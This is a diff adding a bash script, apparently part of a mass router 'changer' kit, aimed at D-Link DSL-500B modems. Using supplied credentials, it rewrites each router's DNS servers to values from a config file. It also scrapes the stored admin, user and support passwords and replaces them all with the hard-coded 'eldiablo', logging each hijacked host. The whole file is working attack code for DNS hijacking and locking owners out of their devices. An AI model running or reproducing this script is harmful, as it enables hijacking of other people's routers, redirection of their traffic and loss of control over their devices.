@@ -1,0 +1,50 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "dnsPrimary=$DNS1&dnsSecondary=$DNS2&dnsDynamic=0&dnsRefresh=1" "http://$HOSTNAME/dnscfg.cgi" 1>/dev/null 2>/dev/null
+for i in `${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi" | egrep "^pwd[a-zA-Z0-9]*.=.*'" | sed "s/^pwd//;s/ = /=/;s/'//g;s/;//"`; do
+	userID=`echo $i | cut -d '=' -f1`
+	userPW=`echo $i | cut -d '=' -f2`
+	case $userID in
+		"Admin")
+			PWadmin="$userPW"
+			;;
+		"User")
+			PWuser="$userPW"
+			;;
+		"Support")
+			PWsupport="$userPW"
+			;;
+	esac
+done
+
+case "$USERNAME" in
+	"admin")
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?usrPassword=$PASSWD" -d "userName=3&pwdOld=$PWuser&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?sptPassword=$PASSWD" -d "userName=2&pwdOld=$PWsupport&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?sysPassword=$PASSWD" -d "userName=1&pwdOld=$PWadmin&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		;;
+	"user")
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?sysPassword=$PASSWD" -d "userName=1&pwdOld=$PWadmin&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?sptPassword=$PASSWD" -d "userName=2&pwdOld=$PWsupport&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?usrPassword=$PASSWD" -d "userName=3&pwdOld=$PWuser&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		;;
+	"support")
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?sysPassword=$PASSWD" -d "userName=1&pwdOld=$PWadmin&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?usrPassword=$PASSWD" -d "userName=3&pwdOld=$PWuser&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/password.cgi?sptPassword=$PASSWD" -d "userName=2&pwdOld=$PWsupport&pwdNew=$PASSWD&pwdCfm=$PASSWD" 1>/dev/null 2>/dev/null
+		;;
+esac
+
+echo "[+] modificado, http://$HOSTNAME $USERNAME:$PASSWORD [D-LINK DSL-500B]"
+echo "http://$HOSTNAME ($USERNAME:$PASSWORD => $PASSWD) [D-LINK DSL-500B]" >> logs/modificados.log
